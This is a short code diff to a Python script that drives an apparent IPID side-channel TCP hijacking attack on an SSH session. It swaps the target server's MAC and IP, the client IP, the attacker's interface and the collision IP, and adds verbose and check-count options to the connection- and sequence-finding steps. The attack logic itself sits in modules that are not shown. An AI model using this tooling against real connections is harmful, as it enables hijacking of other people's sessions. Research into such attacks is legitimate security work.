@@ -8,29 +8,30 @@ from IPID_HCSC.seq_find import Seq_Finder
 from IPID_HCSC.ack_find import Ack_Finder, attack_action_ssh
 
 if __name__ == '__main__':
-    server_mac = '00:0c:29:20:f4:8c'
-    server_ip = '10.10.100.2'
+    server_mac = '60:eb:69:dc:1b:14'
+    server_ip = '192.168.66.112'
     server_port = 22
 
-    client_ip = '10.10.100.1'
+    client_ip = '192.168.66.111'
 
-    attack_bind_if = 'ens33'
-    own_ip_prefix = '10.10.0.0'
-    collision_ip = '10.10.4.197'
+    attack_bind_if = 'eno1'
+    own_ip_prefix = '192.168.0.0'
+    collision_ip = '192.168.4.107'
 
-    # collision = Collision_Finder_2(client_ip=client_ip, server_ip=server_ip, server_mac_addr=server_mac,
-    #                                owned_prefix=own_ip_prefix, bind_iface=attack_bind_if)
-    # collision.run()
+    #collision = Collision_Finder_2(client_ip=client_ip, server_ip=server_ip, server_mac_addr=server_mac,
+    #                               owned_prefix=own_ip_prefix, bind_iface=attack_bind_if, verbose=True)
+    #collision.run()
+    #collison_ip = collision.result
 
-    connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
-                                   server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if)
+    connection = Connection_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip, verbose=True,
+                                   num_check=5,server_port=server_port, server_mac=server_mac, bind_if_name=attack_bind_if)
     connection.run()
     client_port = connection.result
 
     time.sleep(5)
     seq = Seq_Finder(forge_ip=collision_ip, client_ip=client_ip, server_ip=server_ip,
-                     server_port=server_port, client_port=client_port,
-                     server_mac=server_mac, bind_ifname=attack_bind_if, verbose=False)
+                     server_port=server_port, client_port=client_port, check_num=5,
+                     server_mac=server_mac, bind_ifname=attack_bind_if, verbose=True)
     seq.run()
     seq_in_win = seq.result
 
